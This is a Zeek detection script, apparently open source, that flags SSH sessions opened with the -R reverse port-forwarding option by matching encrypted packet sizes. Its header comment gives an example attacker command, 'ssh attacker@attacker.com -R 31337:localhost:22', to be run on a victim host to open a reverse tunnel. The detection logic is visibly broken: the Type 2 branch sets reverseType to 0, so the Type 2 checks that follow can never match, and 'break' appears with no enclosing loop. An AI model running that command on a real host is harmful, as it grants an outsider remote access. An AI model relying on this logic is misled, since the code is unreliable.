# __author__ = 'Ben Reardon'
# __contact__ = 'benjeems@gmail.com @benreardon'
# __version__ = '0.1'
# __license__ = 'GNU General Public License v3.0'
#            packetSrider_R_option.zeek
# zeek script looks for specific patterns in the size and 
# sequence of packets that are unique to cases where the -R 
# option is present in the commandline of the forward session.
# An example of a forward commandline that would trigger 
# this script # would be when this is run on the victim host :
# `ssh attacker@attacker.com -R 31337:localhost:22`
# This -R option is required to support a reverse SSH session 
# from attacker back to the victim at a later stage.
# Logic from python script has been ported to zeek

redef SSH::disable_analyzer_after_detection = F;
global base = 0;  
global index = 0;
global packet_count = 0;
global len_base_4 = 0;
global login_prompt_size = 0;
global reverseType = 0;
global R_has_been_found = 0;

redef enum Notice::Type += {
    SSH_R_Reverse
    };

event ssh_encrypted_packet(c:connection, orig:bool, len:count)
{ 

    #if (R_has_been_found == 1) {
    #  break;
    #}
    #print(" "); print(orig);
    #print(len);
    #print fmt("packet_count %d",  packet_count);
# The forth packet (index = 3) is the size of the servers login prompt.
# This is important to know when failed attempts occur, as a packet of this size 
# replays directly after a failed Client auth packet.
  if (index == 3 && orig == F && !login_prompt_size) {
      login_prompt_size = len;
      print fmt("Found login prompt size of %d",  login_prompt_size); print(" ");
      base = 1;
      index += 1;
      packet_count = 1;
      break;
      }
 
 # Packets relating to setting up reverse tunnels start at packet count 3 after the login prompt   
  if (packet_count == 3 && base == 1 && orig == T) {
    base = 2; 
    print fmt("At base %d of 5",  base); print(" ");
    packet_count = packet_count + 1;
    break;
    }
 
  # TYPE 1 check 
  if (packet_count == 4 && base == 2 && orig == F && len != login_prompt_size) {
    base = 3;
    reverseType = 1;
    print fmt("At base %d of 5",  base); print(" ");
    packet_count = packet_count + 1;
    break;
    }
  if (reverseType == 1 && packet_count == 5 && base == 3 && orig == T) {
    base = 4;
    len_base_4 = len;
    print fmt("At base %d of 5",  base); print(" ");
    packet_count = packet_count + 1;
    break;
    }
  if (reverseType == 1 && packet_count == 6 && base == 4 && orig == F && len != login_prompt_size && len < len_base_4) {
    base = 5; 
    print fmt("At base %d of 5",  base); print(" ");
    print fmt("###### Found a Type 1 -R");
    NOTICE([$note=SSH_R_Reverse,
	$msg = fmt("The -R option was used by the forward connection from %s to %s. This option enables reverse SSH to occur ",c$id$orig_h,c$id$resp_h),
	$sub = fmt("-R option was used (type 1 detected)")]);
    R_has_been_found = 1;
    
    break;
    } 
   
  
  # TYPE 2 check 
  if (packet_count == 4 && base == 2 && orig == T) {
    base = 3;
    reverseType = 0;
    print fmt("At base %d of 5",  base); print(" ");
    packet_count = packet_count + 1;
    break;
    }
  if (reverseType == 2 && packet_count == 5 && base == 3 && orig == F && len != login_prompt_size) {
    base = 4;
    len_base_4 = len;
    print fmt("At base %d of 5",  base); print(" ");
    packet_count = packet_count + 1;
    break;
    }
  if (reverseType == 2 && packet_count == 6 && base == 4 && orig == F && len != login_prompt_size && len < len_base_4) {
    base = 5; 
    print fmt("###### Found a Type 2 -R");
     NOTICE([$note=SSH_R_Reverse,
	$msg = fmt("The -R option was used by the forward connection from %s to %s. This option enables reverse SSH to occur ",c$id$orig_h,c$id$resp_h),
	$sub = fmt("-R option was used (type 2 detected)")]);
    R_has_been_found = 1;
    break;
    } 
   
# If none of the above packets were seen but the size is that of login_prompt_size
# A failed auth attempt must have occured, so reset the packet_count and base
 if (orig == F && len == login_prompt_size) {
      print fmt("Found a re-login prompt size of %d",  login_prompt_size);print(" ");
      packet_count = 1;
      base = 1;
      reverseType = 0;
      break;
      }
      
index += 1;
packet_count += 1;

}
